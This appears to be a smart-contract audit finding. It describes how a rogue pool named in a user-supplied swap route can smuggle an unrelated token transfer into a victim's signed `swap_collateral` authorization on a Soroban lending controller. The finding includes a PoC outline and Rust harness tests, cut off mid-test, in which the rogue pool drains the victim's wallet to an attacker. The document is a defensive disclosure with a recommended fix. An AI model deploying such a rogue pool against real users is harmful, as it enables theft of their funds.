### Title
Rogue swap-route pool can smuggle an unrelated token transfer into the caller's signed `swap_collateral` auth tree - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
`swap_collateral` authenticates only `caller.require_auth()` plus account owner/delegate, then forwards caller-supplied `swap` bytes to the configured router while authorizing only the input-token transfer and measuring the output delta. [1](#0-0) [2](#0-1) [3](#0-2)  The router executes caller-chosen `assets` as hop pools, so an attacker can place a malicious contract in `hop.pool` and have it run inside the victim's authorized controller call. [4](#0-3) [5](#0-4)  A harness test proves a rogue hop can call `token.transfer(victim, attacker, amount)` and have simulation record it as a child of the victim's `swap_collateral` authorization; enforced auth accepts it once that poisoned tree is signed. [6](#0-5) 

### Finding Description
The vulnerable boundary is the strategy swap path: `process_swap_collateral` checks the caller and account, `withdraw_and_swap_from_supply` moves collateral to the controller, and `swap_tokens` invokes `router.execute_strategy` with unvalidated route semantics beyond input amount and output receipt. [7](#0-6) [8](#0-7)  The router's `execute_strategy` requires `sender` auth, decodes an attacker-influenced `StrategyPayload`, and dispatches each hop to `hop.pool` taken from the payload's address registry rather than an allowlisted pool. [9](#0-8) [4](#0-3)  Venue adapters then invoke that pool (`get_reserves`/`swap` for Soroswap-style hops or authorized-pull `swap` for Phoenix/Sushi/Comet), giving the pool execution inside the nested call. [10](#0-9) [11](#0-10)  Because the user-facing authorization is the root `caller.require_auth()` on the controller entrypoint, a token `transfer` requiring the victim's auth that is emitted by the rogue pool is recorded under the same authorized invocation tree, and the host enforces it only as a signed child invocation. [12](#0-11) [13](#0-12) 

### Impact Explanation
A victim who submits a swap-strategy transaction built around a malicious route can lose unrelated wallet tokens that were never supplied to the protocol: the rogue pool's `token.transfer(victim, attacker, victim_balance)` executes when the signed auth tree includes the recorded child. [14](#0-13) [15](#0-14)  This is theft of user funds, not merely a bad fill: the control route steals nothing, while the same route with `amount > 0` drains the victim's external wallet token when the simulated tree is signed. [16](#0-15) 

### Likelihood Explanation
Likelihood is medium: it needs a user to sign a route whose recorded authorization tree contains the extra transfer, which is plausible when integrators/wallets present `swap_collateral`/`multiply`-style routes opaquely, and the attacker only needs to control a pool address embedded in the route's `assets` registry. [17](#0-16) [18](#0-17)  The attack does not require admin keys, oracle manipulation, or protocol liquidity; the reachable path is an owner/delegate calling `swap_collateral` (or another strategy entrypoint that reaches `swap_tokens`) with a crafted `swap`. [2](#0-1) [19](#0-18) 

### Recommendation
Do not let route-selected contracts emit new `require_auth` demands under the user's root strategy authorization: scope strategy auth to an explicit allowlist of sub-invocations, or require routes to use only governance/venue-registered pool addresses rather than arbitrary `assets` entries. [3](#0-2) [17](#0-16)  At minimum, reject any recorded auth tree for `swap_collateral`, `swap_debt`, `multiply`, `repay_debt_with_collateral`, and `flash_position` that contains token spends outside the declared input pull/output payout, and surface that invariant to wallets so a poisoned simulation cannot be signed inadvertently. [20](#0-19) 

### Proof of Concept
1. Attacker deploys a pool-like contract whose `swap`/`get_reserves` callback performs `token.transfer(victim, attacker, victim_balance)` on an unrelated token the victim holds; the test's `RogueHopPool` does exactly this behind a `swap` function. [21](#0-20) 
2. The attacker crafts `swap_collateral(caller=victim, account_id, current=USDC hub asset, amount=5_000 USDC, new=ETH hub asset, swap=payload)` where the payload's `assets` registry names the rogue pool and the program routes through it; production dispatch invokes `hop.pool` from that registry. [4](#0-3) [22](#0-21) 
3. Simulation records the rogue `token.transfer` as a child of the victim's `swap_collateral` root and the test asserts the recorded tree equals `[(alice, swap_collateral -> transfer(alice, attacker, WALLET_BALANCE))]`. [23](#0-22) 
4. If the victim signs only the honest root, enforced auth rejects the transfer; if the victim signs the simulated tree, the transfer executes and Alice's unrelated wallet token goes to the attacker while the protocol still credits the fair ETH output. [20](#0-19)

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
